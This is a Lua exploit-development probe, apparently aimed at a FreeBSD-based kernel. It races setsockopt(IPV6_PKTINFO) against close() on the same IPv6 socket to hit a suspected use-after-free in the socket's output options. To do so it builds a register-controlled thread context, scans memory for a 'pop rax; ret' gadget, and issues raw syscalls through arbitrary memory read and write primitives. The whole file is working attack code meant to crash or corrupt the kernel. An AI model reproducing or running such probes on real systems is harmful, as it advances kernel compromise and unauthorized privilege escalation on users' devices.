-- CRASH_CLASS: HIGH
-- PROBE 970a: setsockopt(IPV6_PKTINFO) racing close() on the same descriptor
--
-- The IPv6 output options hang off the inpcb (inp_outputopts) and are freed with
-- it. A thread inside setsockopt while another closes the same socket is the one
-- shape nobody has run on 14.10. The child does the 5-argument setsockopt through
-- the register-controlled call trampoline; the parent closes the fd the moment the
-- child is created (thr_create returns before the child's first instruction, so the
-- two orderings are both reachable).

print("=== PROBE 970a: SETSOCKOPT vs CLOSE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function show(tag, ok, rv)
    if not ok then print(string.format("  [%s] PCALL-FAIL", tag)) return end
    local h,l=hi_lo(rv) print(string.format("  [%s] ret=0x%08X_%08X", tag, h, l))
end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end

local info=memory.alloc(0x200) for i=0,0x1FC,4 do wd(info+i,0) end wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local base=rd(info+0x10C)*4294967296+rd(info+0x108)
local size=rd(info+0x110)
local function find_pat(pat)
    local off=0
    while off<size do
        local want=size-off if want>0x1000 then want=0x1000 end
        local o,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not o or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true) if i then return base+off+i-1 end
        off=off+want
    end
end
local fn=to_num(syscall.pipe.fn_addr)
local pop_rax=find_pat(string.char(0x58,0xC3))
print(string.format("[0] pid=%s base=0x%X pop_rax=0x%X", tostring(to_num(mk(20)())), base, pop_rax or 0))

local C={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,
         RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local PAGE=0x4000
local function spawn5(sysno,a1,a2,a3,a4,a5)
    local block=memory.alloc(PAGE*2)
    for i=0,PAGE*2-4,4 do wd(block+i,0) end
    local ctx=memory.alloc(0x200) for i=0,0x1FC,4 do wd(ctx+i,0) end
    wd(ctx+C.MAGIC,0x480) wd(ctx+C.TYPE,0x10000) wd(ctx+C.CS,0x43) wd(ctx+C.SS,0x3b)
    wq(ctx+C.RIP,uint64(fn)) wq(ctx+C.RSP,uint64(block+PAGE*2-0x200))
    wq(ctx+C.RDI,uint64(a1)) wq(ctx+C.RSI,uint64(a2)) wq(ctx+C.RDX,uint64(a3))
    wq(ctx+C.RCX,uint64(a4)) wq(ctx+C.R8,uint64(a5))
    wq(ctx+C.RAX,uint64(sysno))
    local ch=block+PAGE*2-0x200
    wq(ch,uint64(pop_rax)) wq(ch+8,uint64(431)) wq(ch+16,uint64(fn))
    return mk(430)(uint64(ctx))
end

local buf=memory.alloc(0x20)
for i=0,0x1C,4 do wd(buf+i,0) end
wd(buf+0x10,1)   -- ifindex 1, all-zero address
local ok0,rv0=pcall(function() return mk(97)(uint64(28),uint64(2),uint64(0)) end)
print(string.format("  [1] socket(AF_INET6,SOCK_DGRAM) = %s", tostring(rv0 and to_num(rv0) or -1)))

local survived, closed_first, sockopt_first, both = 0,0,0,0
for round=1,12 do
    local ok,rv=pcall(function() return mk(97)(uint64(28),uint64(2),uint64(0)) end)
    local fd = ok and to_num(rv) or -1
    if fd<=0 then print("  socket failed at round "..round) break end
    local bufaddr = (function() local s=tostring(buf) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(buf) end)()
    local ok2,rv2=pcall(function() return spawn5(105, fd, 41, 46, bufaddr, 0x14) end)
    local okc, rvc = pcall(function() return mk(6)(uint64(fd)) end)
    local closed = okc and to_num(rvc)==0
    mk(240)(uint64(0),uint64(5000000))
    if closed then closed_first=closed_first+1 end
    print(string.format("  [r%d] fd=%d spawned=%s close=%s", round, fd, tostring(ok2 and (rv2 and to_num(rv2)==0) or false), tostring(closed)))
    mk(240)(uint64(0),uint64(5000000))
end

print(string.format("[Z] alive pid=%s close_ok=%d", tostring(to_num(mk(20)())), closed_first))
print("=== COMPLETE ===")
